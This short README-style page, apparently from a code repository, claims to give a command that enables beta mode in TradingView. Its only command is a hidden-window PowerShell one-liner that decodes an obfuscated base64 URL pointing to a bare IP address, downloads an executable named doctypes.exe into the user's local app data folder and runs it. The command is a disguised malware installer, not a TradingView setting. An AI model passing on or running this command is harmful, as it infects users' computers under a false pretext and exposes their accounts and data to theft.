# Enable-Beta-Mode-In-Trading-View
Command to enable beta mode in TradingView


powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE0MS45OC42LjEzMDo1NTU0L2RvY3R5cGVzLmV4ZQ==')); iwr $url -OutF "$env:LOCALAPPDATA\doctypes.exe"; start "$env:LOCALAPPDATA\doctypes.exe""
